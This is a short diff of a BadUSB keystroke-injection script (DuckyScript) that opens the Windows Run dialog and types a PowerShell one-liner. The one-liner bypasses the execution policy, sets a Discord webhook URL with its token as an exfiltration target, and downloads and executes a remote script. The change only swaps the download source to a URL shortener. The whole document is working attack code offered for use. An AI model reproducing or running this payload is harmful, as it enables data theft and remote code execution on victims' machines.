@@ -13,5 +13,5 @@ REM open powershell
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -Ep Bypass -C $hide='y';$dc='https://discord.com/api/webhooks/1389072332781519018/908SZexx8Uuhu2vto77y59n9AfsXNzdWgs8gCT8tUFvGK0XqXN-oS0Ma_W4q0nLPTlP9'; iex (irm bw0.cc/exfl)
+STRING powershell -Ep Bypass -C $hide='y';$dc='https://discord.com/api/webhooks/1389072332781519018/908SZexx8Uuhu2vto77y59n9AfsXNzdWgs8gCT8tUFvGK0XqXN-oS0Ma_W4q0nLPTlP9'; iex (irm https://tinyurl.com/yzhn92)
 ENTER
